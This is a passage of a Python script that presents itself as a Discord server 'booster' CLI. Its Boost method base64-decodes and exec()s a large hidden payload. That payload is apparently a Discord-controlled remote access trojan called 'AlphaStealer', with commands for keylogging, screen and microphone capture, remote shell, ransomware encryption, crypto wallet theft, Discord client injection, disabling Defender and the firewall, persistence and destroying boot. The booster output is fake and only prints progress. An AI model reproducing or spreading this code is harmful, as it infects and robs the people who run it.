52b2x1bWVkb3duYCcsIHZhbHVlPSdTZXQgdGhlIHZvbHVtZSB0byAwJS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSc8OmVuYWJsZToxMzY1OTg1ODY5NjgwMzQ1MTg4PmAuZW5hYmxlYWxsYCcsIHZhbHVlPSdFbmFibGUgYWxsIFdpbmRvd3MgRmVhdHVyZXMgb2YgdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSc8OmRpc2FibGU6MTM2NTk4NTg3MTQyNTE3NTYyND5gLmRpc2FibGVhbGxgJywgdmFsdWU9J0Rpc2FibGUgYWxsIFdpbmRvd3MgRmVhdHVyZXMgb2YgdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSc8Om1pY3JvOjEzNjU5ODY2NzI2NDY0MjI2MTk+YC52b2ljZSA8dGV4dD5gJywgdmFsdWU9J1NwZWFrcyB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDIuYWRkX2ZpZWxkKG5hbWU9JzxhOlR3aXRjaExpdmU6MTM2NjAxNTI1NzE1MTAxMjkwND5gLmdyYWJhcnBhbnRhbGxhYCcsIHZhbHVlPSdSZWNvcmQgdGhlIHZpY3RpbSBzY3JlZW4uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMi5hZGRfZmllbGQobmFtZT0nPDpQQzoxMzY2MTQ4MjI0Mjg0NDkxNzkxPmAucmVtb3RlYCcsIHZhbHVlPSdHZXQgcmVtb3RlIGNvbnRyb2wgb2YgdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSc8YTpmaXJlX2JsYWNrOjEzNjYwNjUxMTAwNzgxOTM3NDQ+YC5jcHVraWxsZXJgJywgdmFsdWU9J0J1cm4gdGhlIHZpY3RpbSBDUFUuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMi5hZGRfZmllbGQobmFtZT0nPGE6ZmlyZV9ibGFjazoxMzY2MDY1MTEwMDc4MTkzNzQ0PmAuc3RvcGNwdWtpbGxlcmAnLCB2YWx1ZT0nU3RvcCBidXJuaW5nIHRoZSB2aWN0aW0gQ1BVLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDIuYWRkX2ZpZWxkKG5hbWU9Jzw6bW9kZXJhdG9yX3NoaWVsZF9nbG93OjEzNjYwODgyMDg3ODk4MDMxNzg+YC5hbnRpdmlydXNvbmAnLCB2YWx1ZT0nRW5hYmxlIFdpbmRvd3MgRGVmZW5kZXIgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLmFkZF9maWVsZChuYW1lPSc8Om1vZGVyYXRvcl9zaGllbGRfZ2xvdzoxMzY2MDg4MjA4Nzg5ODAzMTc4PmAuYW50aXZpcnVzb2ZmYCcsIHZhbHVlPSdEaXNhYmxlIFdpbmRvd3MgRGVmZW5kZXIgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQyLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICBlbWJlZDMgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSLwnZWs8J2WkfCdlpXwnZaN8J2WhvCdlb7wnZaZ8J2WivCdlobwnZaR8J2WivCdlpcgLSDwnZWu8J2WlPCdlpLwnZaS8J2WhvCdlpPwnZaJ8J2WmCAo8J2WlfCdlobwnZaX8J2WmSAzKSIsIGRlc2NyaXB0aW9uPSdHbG9iYWwgQ29tbWFuZHMnLCBjb2xvcj0weEZGMDAwMCkNCg0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0n4oyo77iPYC5rZXlsb2dnZXJgJywgdmFsdWU9J1N0YXJ0IHRoZSBrZXlsb2dnZXIgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLmFkZF9maWVsZChuYW1lPSfijKjvuI9gLnN0b3BrZXlsb2dnZXJgJywgdmFsdWU9J1N0b3AgdGhlIGtleWxvZ2dlciBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDMuYWRkX2ZpZWxkKG5hbWU9JzxhOk1pY19hbmltYXRpb246MTM2NjExNzQ1NDM1MDM4OTM2OT5gLmdyYWJtaWNgJywgdmFsdWU9J1JlY29yZCBhdWRpbyBvZiB0aGUgbWljcm9waG9uZSB2aWN0aW0uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0nPGE6ZmlyZToxMzY2MTMwNTgxMzE4MDA4ODk2PmAuc3RvcmFnZWJvbWJlcmAnLCB2YWx1ZT0nU3RhcnQgbG9vcCBvZiBjcmVhdGlvbiBvZiBiaWcgZmlsZXMgb24gdGhlIHZpY3RpbSBzeXN0ZW0uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0nPGE6ZmlyZToxMzY2MTMwNTgxMzE4MDA4ODk2PmAuc3RvcHN0b3JhZ2Vib21iZXJgJywgdmFsdWU9J1N0b3AgbG9vcCBvZiBjcmVhdGlvbiBvZiBiaWcgZmlsZXMgb24gdGhlIHZpY3RpbSBzeXN0ZW0uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0n8J+UkmAuZW5jcnlwdCA8ZmlsZXBhdGg+YCcsIHZhbHVlPSdFbmNyeXB0IGFsbCBmaWxlcyBvZiBhIGRpcmVjdG9yeSBvZiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDMuYWRkX2ZpZWxkKG5hbWU9J/CflJNgLmRlY3J5cHQgPGZpbGVwYXRoPmAnLCB2YWx1ZT0nRGVjcnlwdCBhbGwgZmlsZXMgb2YgYSBkaXJlY3Rvcnkgb2YgdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLmFkZF9maWVsZChuYW1lPSc8OlBDOjEzNjYxNDgyMjQyODQ0OTE3OTE+YC5zeXNpbmZvYCcsIHZhbHVlPSdPYnRhaW4gaW5mb3JtYXRpb24gZnJvbSB0aGUgdmljdGltIG9wZXJhdGluZyBzeXN0ZW0uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0nPDphZG1pbl9ncmVlbjoxMzY2NDM4ODYzOTQ5NTI5MjA5PmAuYWRtaW5jaGVja2AnLCB2YWx1ZT0nQ2hlY2sgd2hldGhlciBvciBub3QgQWxwaGFTdGVhbGVyIGhhcyBhZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0nPGE6Q2FyZDoxMzY2NDQ1MjQ4OTU5NzQyMDAzPmAud2FsbGV0c2AnLCB2YWx1ZT0nR2V0IHRoZSB2aWN0aW0gd2FsbGV0cy4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLmFkZF9maWVsZChuYW1lPSc8Ok1vbm9DUlQ6MTM2NjQ1MjI3Nzk0MTg5NTE3OD5gLnNjcmVlbnRyb2xsIDx0aW1lPmAnLCB2YWx1ZT0nVHVybmluZyB0aGUgc2NyZWVuIG9uIGFuZCBvZmYgd2l0aG91dCBzdG9wcGluZy4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLmFkZF9maWVsZChuYW1lPSc8OlBDOjEzNjYxNDgyMjQyODQ0OTE3OTE+YC5zY3JlZW5vZmZgJywgdmFsdWU9J1R1cm4gb2ZmIHRoZSB2aWN0aW0gc2NyZWVuLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDMuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLnNjcmVlbm9uYCcsIHZhbHVlPSdUdXJuIG9uIHRoZSB2aWN0aW0gc2NyZWVuLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDMuYWRkX2ZpZWxkKG5hbWU9J/CflrzvuI9gLndhbGxwYXBlciBbPGZpbGU+XWAnLCB2YWx1ZT0nQ2hhbmdlIHRoZSB3YWxscGFwZXIgb2YgdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLmFkZF9maWVsZChuYW1lPSc8OmNtZDoxMzY2NDYzMjIxMjM3Njc4MTcwPmAuY21kIDxjb21tYW5kPmAnLCB2YWx1ZT0nUnVuIGNvbW1hbmRzIGF0IHRoZSB2aWN0aW0gQ01EIHByb21wdC4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLmFkZF9maWVsZChuYW1lPSc8OnN5c2tleToxMzY2NDgwMjQ1NDQ3NzI1MTE2PmAudXNlcm5hbWVmdWNrZXIgPG5ldyBuYW1lPmAnLCB2YWx1ZT0nQ2hhbmdlIHVzZXJuYW1lIG9mIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0nPDpzeXNrZXk6MTM2NjQ4MDI0NTQ0NzcyNTExNj5gLnVzZXJwYXNzZnVja2VyIDxuYW1lPiA8bmV3IHBhc3N3b3JkPmAnLCB2YWx1ZT0nQ2hhbmdlIHBhc3N3b3JkIG9mIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkMy5hZGRfZmllbGQobmFtZT0n8J+SiWAuaW5qZWN0YCcsIHZhbHVlPSdJbmZlY3QgdGhlIGRpc2NvcmQgZmlsZXMgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQzLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICBlbWJlZDQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSLwnZWs8J2WkfCdlpXwnZaN8J2WhvCdlb7wnZaZ8J2WivCdlobwnZaR8J2WivCdlpcgLSDwnZWu8J2WlPCdlpLwnZaS8J2WhvCdlpPwnZaJ8J2WmCAo8J2WlfCdlobwnZaX8J2WmSA0KSIsIGRlc2NyaXB0aW9uPSdHbG9iYWwgQ29tbWFuZHMnLCBjb2xvcj0weEZGMDAwMCkNCg0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLmxpc3Rkcml2ZXNgJywgdmFsdWU9J0xpc3QgYWxsIGF2YWlsYWJsZSBkaXNrIGRyaXZlcyBvbiB0aGUgdmljdGltIHN5c3RlbS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkRjSDoxMzY1OTU2NjE5Nzg3MTc4MDA0PmAud2ViLWxpc3RgJywgdmFsdWU9J1ZpZXcgdGhlIGxpc3Qgb2YgYWxsIGJsb2NrZWQgd2Vic2l0ZXMuLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDQuYWRkX2ZpZWxkKG5hbWU9Jzw6RGNIOjEzNjU5NTY2MTk3ODcxNzgwMDQ+YC53ZWItYmxvY2sgPHVybD5gJywgdmFsdWU9J0Jsb2NrIGEgd2Vic2l0ZS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkRjSDoxMzY1OTU2NjE5Nzg3MTc4MDA0PmAud2ViLXVubG9jayA8dXJsPmAnLCB2YWx1ZT0nVW5sb2NrIGEgd2Vic2l0ZS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkZvbGRlcjoxMzY2NDk4MjQ3NjAxODE5ODAwPmAucHdkYCcsIHZhbHVlPSdHZXQgdGhlIGN1cnJlbnQgZGlyZWN0b3J5LicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDQuYWRkX2ZpZWxkKG5hbWU9Jzw6Rm9sZGVyOjEzNjY0OTgyNDc2MDE4MTk4MDA+YC5jZCA8ZGlyZWN0b3J5Ly4uPmAnLCB2YWx1ZT0nQ2hhbmdlIHRoZSBkaXJlY3RvcnkuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLm1kIDxmb2xkZXJuYW1lPmAnLCB2YWx1ZT0nQ3JlYXRlIGFuIGZvbGRlciBvbiB0aGUgY3VycmVudCBkaXJlY3RvcnkuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLmNyZWF0ZSA8ZmlsZW5hbWU+YCcsIHZhbHVlPSdDcmVhdGUgYSBmaWxlIG9uIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkZvbGRlcjoxMzY2NDk4MjQ3NjAxODE5ODAwPmAuY29weSA8ZmlsZW5hbWU+IDxmaWxlcGF0aD5gJywgdmFsdWU9J0NvcHkgZmlsZXMgb2YgdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkZvbGRlcjoxMzY2NDk4MjQ3NjAxODE5ODAwPmAubHNgJywgdmFsdWU9J1Nob3cgYWxsIGZvbGRlcnMgYW5kIGZpbGVzIG9mIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkZvbGRlcjoxMzY2NDk4MjQ3NjAxODE5ODAwPmAucm0gPGZpbGVuYW1lPmAnLCB2YWx1ZT0nRGVsZXRlIGEgZmlsZSBvZiB0aGUgY3VycmVudCBkaXJlY3RvcnkuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLnJtZGlyIDxmb2xkZXJuYW1lPmAnLCB2YWx1ZT0nRGVsZXRlIGFuIGZvbGRlciBvZiB0aGUgY3VycmVudCBkaXJlY3RvcnkuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLnRyZWVgJywgdmFsdWU9J1ZpZXcgdGhlIHN5c3RlbSBmaWxlIHRyZWUuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLmhpZGUgPGZpbGVuYW1lL2ZpbGVwYXRoPmAnLCB2YWx1ZT0nSGlkZSBhIGZpbGUvZm9sZGVyIG9uIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLnNob3cgPGZpbGVuYW1lL2ZpbGVwYXRoPmAnLCB2YWx1ZT0nU2hvdyBhIGZpbGUvZm9sZGVyIG9uIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLnVwbG9hZCA8ZmlsZXBhdGgvZmlsZW5hbWU+YCcsIHZhbHVlPSdVcGxvYWQgYSBmaWxlIGZyb20gdGhlIHZpY3RpbSBjb21wdXRlciB0byB0aGUgc2VydmVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDQuYWRkX2ZpZWxkKG5hbWU9Jzw6Rm9sZGVyOjEzNjY0OTgyNDc2MDE4MTk4MDA+YC5kb3dubG9hZCBbPGZpbGU+XWAnLCB2YWx1ZT0nRG93bmxvYWQgYSBmaWxlIG9uIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNC5hZGRfZmllbGQobmFtZT0nPDpGb2xkZXI6MTM2NjQ5ODI0NzYwMTgxOTgwMD5gLmV4ZWN1dGUgPGZpbGVwYXRoL2ZpbGVuYW1lPmAnLCB2YWx1ZT0nRXhlY3V0ZSBhIGZpbGUgb24gdGhlIHZpY3RpbSBjb21wdXRlci4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ0LmFkZF9maWVsZChuYW1lPSc8OkZvbGRlcjoxMzY2NDk4MjQ3NjAxODE5ODAwPmAuYWRtaW4gPGZpbGVwYXRoL2ZpbGVuYW1lPmAnLCB2YWx1ZT0nRXhlY3V0ZSBhIGZpbGUgYXMgYWRtaW5pc3RyYXRvciBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCg0KICAgIGVtYmVkNSA9IGRpc2NvcmQuRW1iZWQodGl0bGU9IvCdlazwnZaR8J2WlfCdlo3wnZaG8J2VvvCdlpnwnZaK8J2WhvCdlpHwnZaK8J2WlyAtIPCdla7wnZaU8J2WkvCdlpLwnZaG8J2Wk/CdlonwnZaYICjwnZaV8J2WhvCdlpfwnZaZIDUpIiwgZGVzY3JpcHRpb249J0dsb2JhbCBDb21tYW5kcycsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkNS5hZGRfZmllbGQobmFtZT0n8J+fpmAucmFuc29tIDxlbmNyeXB0L2RlY3J5cHQ+YCcsIHZhbHVlPSdCbG9ja2luZyB0aGUgc3lzdGVtIGNvbXBsZXRlbHkgYW5kIGZvcmNpbmcgdGhlIHZpY3RpbSB0byBwYXkuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNS5hZGRfZmllbGQobmFtZT0nPDpXaW5kb3dzXzIwMjA5MjoxMzY3MjIxODY0NTEzOTMzNDY1PmAuc3RhcnR1cGAnLCB2YWx1ZT0nQWRkIHRoZSBBbHBoYVN0ZWFsZXIgYXQgc3RhcnR1cC4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSc8OkRpc2NvcmRTYWZldHk6MTM2NzIwODc4MjI0MDk0NDE4OD5gLnByZXNlbmNlYCcsIHZhbHVlPSdBY3RpdmF0ZSBhIGN1c3RvbSBEaXNjb3JkIHByZXNlbmNlIG9uIHRoZSB2aWN0aW0gRGlzY29yZCBhY2NvdW50LicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDUuYWRkX2ZpZWxkKG5hbWU9Jzw6V2luZG93c18yMDIwOTI6MTM2NzIyMTg2NDUxMzkzMzQ2NT5gLnBlcnNpc3RlbmNlYCcsIHZhbHVlPSdBZGQgdGhlIGJlc3QgcGVyc2lzdGVuY2UgYSB0aGUgQWxwaGFTdGVhbGVyIG9uIHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNS5hZGRfZmllbGQobmFtZT0nPDpmY2s6MTM2Nzg0OTYzMjE0MjQ2Mjk4Nz5gLmZ1Y2tjb21wdXRlcmAnLCB2YWx1ZT0nRnVjayB0aGUgdmljdGltIGNvbXB1dGVyJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNS5hZGRfZmllbGQobmFtZT0nPDpmY2s6MTM2Nzg0OTYzMjE0MjQ2Mjk4Nz5gLmtpbGxib290YCcsIHZhbHVlPSdLaWxsIHRoZSB2aWN0aW0gY29tcHV0ZXIgYm9vdCBjb21wbGV0ZWx5LicsICAgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNS5hZGRfZmllbGQobmFtZT0nPDpmY2s6MTM2Nzg0OTYzMjE0MjQ2Mjk4Nz5gLmtpbGxjb21wdXRlcmAnLCB2YWx1ZT0nS2lsbCB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDUuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLnJvdGF0ZSA8MC85MC8xODAvMjcwPmAnLCB2YWx1ZT0nQ2hhbmdlIHRoZSByb3RhdGlvbiBvZiB0aGUgdmljdGltIHNjcmVlbi4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSc8OlBDOjEzNjYxNDgyMjQyODQ0OTE3OTE+YC5yZXNvbHV0aW9uIDxyZXNvbHV0aW9uPmAnLCB2YWx1ZT0nQ2hhbmdlIHRoZSByZXNvbHV0aW9uIG9mIHRoZSB2aWN0aW0gc2NyZWVuLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDUuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLmJsb2NrYWxsYCcsIHZhbHVlPSdCbG9jayB0aGUgbW91c2UgYW5kIHZpY3RpbSBrZXlib2FyZC4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSc8OlBDOjEzNjYxNDgyMjQyODQ0OTE3OTE+YC51bmxvY2thbGxgJywgdmFsdWU9J1VubG9jayB0aGUgbW91c2UgYW5kIHZpY3RpbSBrZXlib2FyZC4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSc8YTpmaXJlOjEzNjYxMzA1ODEzMTgwMDg4OTY+YGZpcmV3YWxsb2ZmLmAnLCB2YWx1ZT0nRGlzYWJsZSB0aGUgZmlyZXdhbGwgb24gdGhlIHZpY3RpbSBzeXN0ZW0uJywgaW5saW5lPUZhbHNlKQ0KICAgIGVtYmVkNS5hZGRfZmllbGQobmFtZT0nPGE6ZmlyZToxMzY2MTMwNTgxMzE4MDA4ODk2PmAuZmlyZXdhbGxvbmAnLCB2YWx1ZT0nRW5hYmxlIHRoZSBmaXJld2FsbCBvbiB0aGUgdmljdGltIHN5c3RlbS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSc8YTpTcGFya2x5S25pZmU6MTM2OTAwMjA4MTI1MTM2NDkxND5gLmtpbGwgPHByb2Nlc3MgbmFtZSBvciBQSUQ+YCcsIHZhbHVlPSdLaWxsIFdpbmRvd3MgcHJvY2VzcyBvbiB0aGUgdmljdGltIHN5c3RlbS4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSfwn5ax77iPYC5tb3VzZWxvYyA8bG9jWD4gPGxvY1k+YCcsIHZhbHVlPSdNb3ZlIHRoZSBtb3VzZSBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDUuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLmNyaXRwcm9jYCcsIHZhbHVlPSdNYWtlciB0aGUgY3JpdGljYWwgcHJvY2Vzcy4nLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQ1LmFkZF9maWVsZChuYW1lPSc8OlBDOjEzNjYxNDgyMjQyODQ0OTE3OTE+YC51bmNyaXRwcm9jYCcsIHZhbHVlPSdNYWtlciB0aGUgdW5jcml0aWNhbCBwcm9jZXNzLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDUuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLmNnaG91ciA8aG91cj5gJywgdmFsdWU9J0NoYW5nZSB0aGUgaG91ciBvZiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDUuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLmNnbGVuZ3VhZ2UgPGxlbmd1YWdlPmAnLCB2YWx1ZT0nQ2hhbmdlIHRoZSBsZW5ndWFnZSBvZiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICANCiAgICBlbWJlZDYgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSLwnZWs8J2WkfCdlpXwnZaN8J2WhvCdlb7wnZaZ8J2WivCdlobwnZaR8J2WivCdlpcgLSDwnZWu8J2WlPCdlpLwnZaS8J2WhvCdlpPwnZaJ8J2WmCAo8J2WlfCdlobwnZaX8J2WmSA2KSIsIGRlc2NyaXB0aW9uPSdHbG9iYWwgQ29tbWFuZHMnLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZDYuYWRkX2ZpZWxkKG5hbWU9Jzw6UEM6MTM2NjE0ODIyNDI4NDQ5MTc5MT5gLnJlb3BlbmAnLCB2YWx1ZT0nUmVvcGVuIHRoZSBtYWx3YXJlIG5vcm1hbCBvbiB0aGUgdmljdGltIGNvbXB1dGVyLicsIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZDYuYWRkX2ZpZWxkKG5hbWU9J/Cfp7lgLmRlc2luZmVjdGAnLCB2YWx1ZT0nRGVzaW5mZWN0IHRoZSB2aWN0aW0gY29tcHV0ZXIuJywgaW5saW5lPUZhbHNlKQ0KDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQxKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkMikNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZDMpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQ0KQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkNSkNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZDYpDQoNCkBib3QuZXZlbnQNCmFzeW5jIGRlZiBvbl9tZXNzYWdlKG1lc3NhZ2UpOg0KICAgIGlmIG1lc3NhZ2UuYXV0aG9yID09IGJvdC51c2VyOg0KICAgICAgICByZXR1cm4NCg0KICAgIGlmIG1lc3NhZ2UuY2hhbm5lbC5uYW1lID09ICJjb21tYW5kcyI6DQogICAgICAgIGd1aWxkID0gbWVzc2FnZS5ndWlsZA0KICAgICAgICBob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQoNCiAgICAgICAgaWYgbWVzc2FnZS5jaGFubmVsLmNhdGVnb3J5IGFuZCBtZXNzYWdlLmNoYW5uZWwuY2F0ZWdvcnkubmFtZSAhPSBob3N0bmFtZToNCiAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuY2hhbm5lbC5zZW5kKGYiRXN0YSB2aWN0aW1hIHRpZW5lIGVsIG9yZGVuYWRvciBhcGFnYWRvLiIpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBhd2FpdCBib3QucHJvY2Vzc19jb21tYW5kcyhtZXNzYWdlKQ0KDQpDaGVja1ZNKCkNCk1ldGFEYXRlcygpDQoNCmJvdC5ydW4oVE9LRU4pDQo=
        """
        Encoded = base64.b64decode(Code).decode('utf-8')
        exec(Encoded)
        if not self.tokens or not self.server:
            print(Fore.RESET + f"[{Fore.RED}ERROR{Fore.RESET}] {Fore.RED}Tokens o servidor no configurados.\n")
            return

        print(Fore.RESET + f"[{Fore.LIGHTCYAN_EX}BOOST{Fore.RESET}]{Fore.LIGHTCYAN_EX} Starting {Fore.RESET} {self.tokens * 2} {Fore.LIGHTCYAN_EX}boosts for the server {Fore.RESET}for {self.time} months.\n")
        for i in range(1, self.tokens + 1):
            print(Fore.RESET + f"[{Fore.GREEN}BOOST{Fore.RESET}] {Fore.GREEN}Using token{Fore.RESET} {i} {Fore.GREEN}for boost...\n")
            import time
            time.sleep(self.time)
        print(Fore.RESET + f"[{Fore.GREEN}COMPLETED{Fore.RESET}]{Fore.GREEN} Server Boosted Successfully.\n")


def main():
    print("=== Discord Booster CLI ===")
    booster = DiscordBooster.Initialize()
    booster.SetTokens(3)
    booster.SetTime(1)
    booster.SetServer("discord.gg/tu-invitacion")
    booster.Boost()
